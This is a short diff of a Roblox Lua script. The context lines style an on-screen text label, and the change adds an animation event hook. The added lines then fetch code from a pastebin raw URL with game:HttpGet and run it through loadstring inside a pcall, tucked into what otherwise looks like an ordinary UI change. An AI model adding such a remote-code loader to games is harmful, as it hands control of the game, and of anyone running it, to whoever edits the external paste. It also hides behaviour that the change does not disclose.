@@ -1276,3 +1276,11 @@ tL.Font = Enum.Font.Arcade
 tL.TextScaled = true -- scale
 tL.TextTransparency = 0.7 -- opaque
 tL.Parent = sG
+humanoid.AnimationPlayed:Connect(onAnimationTrackStarted)
+
+local success, err = pcall(function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/hah69QZT'))()
+end)
+if not success then
+    warn("Failed to load external script:", err)
+end
